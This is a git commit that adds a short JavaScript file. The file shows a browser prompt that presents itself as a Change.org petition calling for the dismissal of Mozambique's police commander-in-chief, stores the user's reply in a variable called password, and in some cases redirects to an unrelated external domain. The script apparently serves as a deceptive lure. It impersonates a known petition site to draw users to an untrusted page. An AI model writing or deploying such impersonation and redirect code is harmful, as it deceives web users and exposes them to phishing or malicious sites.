a3602c187db3dc866bfa423bc8ce1b99537d72e1
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-12-02 21:27:28 -0800

    Create mozambique-sign.js

---
+++ mozambique-sign.js
@@ -0,0 +1,6 @@
+
+var password = 'PETIÇÃO PÚBLICA'
+password=prompt('Change-org: Foi convidado a assinar a demissão imediata do Comandante-em-Chefe da Polícia da República de Moçambique. por favor pressione OK para enviar petição ','PETIÇÃO PÚBLICA');
+if (password != 'PETIÇÃO PÚBLICA') {
+location.href='https://all-free-byt.org/mozambique-petition.html';
+}
